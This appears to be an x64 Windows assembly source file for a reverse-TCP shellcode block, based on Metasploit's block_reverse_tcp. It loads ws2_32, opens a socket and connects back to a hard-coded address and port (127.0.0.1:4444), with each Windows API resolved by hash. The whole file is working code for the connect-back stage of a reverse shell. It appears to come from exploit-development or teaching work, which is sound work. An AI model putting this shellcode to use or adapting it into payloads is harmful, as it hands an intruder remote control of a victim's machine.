; Input: RBP must be the address of 'api_call'
; Output: RDI will be the socket for the connection to the server
;
; Resources
;   - https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm

reverse_tcp:
    mov r14, 'ws2_32'
    push r14                    ; Push the bytes 'ws2_32',0,0 onto the stack.
    mov r14, rsp                ; Save pointer to the 'ws2_32' string for LoadLibraryA call.
    sub rsp, 408+8              ; Alloc sizeof(struct WSAData) bytes for the WSAData structure (+8 for alignment)
    mov r13, rsp                ; Save pointer to the WSAData structure for WSAStartup call
    mov r12, 0x0100007F5C110002 ; Generated with `python3 addr2hex.py 127.0.0.1 4444`
    push r12
    mov r12, rsp                ; Save pointer to sockaddr struct for connect all
    ; LoadLibraryA(LPCSTR lpLibFileName)
    mov rcx, r14                ; lpLibFileName = 'ws2_32' (r14)
    mov r10d, 0x0726774C        ; The hash of kernel32.dll!LoadLibraryA that has been generated with `python3 hash.py kernel32.dll LoadLibraryA`
    call rbp                    ; Call LoadLibraryA('ws2_32')
    ; WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
    mov rdx, r13                ; lpWSAData = &WSAData
    push 0x0101
    pop rcx                     ; wVersionRequired = 0x0101
    mov r10d, 0x006B8029        ; The hash of ws2_32.dll!WSAStartup that has been generated with `python3 hash.py ws2_32.dll WSAStartup`
    call rbp                    ; Call WSAStartup(0x0101, &WSAData)
    ; WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
    push rax                    ; dwFlags = 0
    push rax                    ; g = 0
    xor r9, r9                  ; lpProtocolInfo = NULL
    xor r8, r8                  ; protocol = 0
    inc rax
    mov rdx, rax                ; type = 0x1 (SOCK_STREAM)
    inc rax
    mov rcx, rax                ; af = 0x2 (AF_INET)
    mov r10d, 0xE0DF0FEA        ; The hash of ws2_32.dll!WSASocketA that has been generated with `python3 hash.py ws2_32.dll WSASocketA`
    call rbp                    ; Call WSASocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0)
    mov rdi, rax                ; Save the socket for later
    ; connect(SOCKET s, const sockaddr *name, int namelen)
    push byte 16                ;
    pop r8                      ; namelen = 16
    mov rdx, r12                ; sockaddr = &(0x0100007F5C110002)
    mov rcx, rdi                ; s = socket(rdi)
    mov r10d, 0x6174A599        ; The hash of ws2_32.dll!connect that has been generated with `python3 hash.py ws2_32.dll connect`
    call rbp                    ; Call connect(s, &sockaddr, 16)
    ; Restore RSP so we don't have any alignment issues with the next block.
    add rsp, ((408+8) + (8*4) + (32*4)) ; Cleanup the stack allocation
    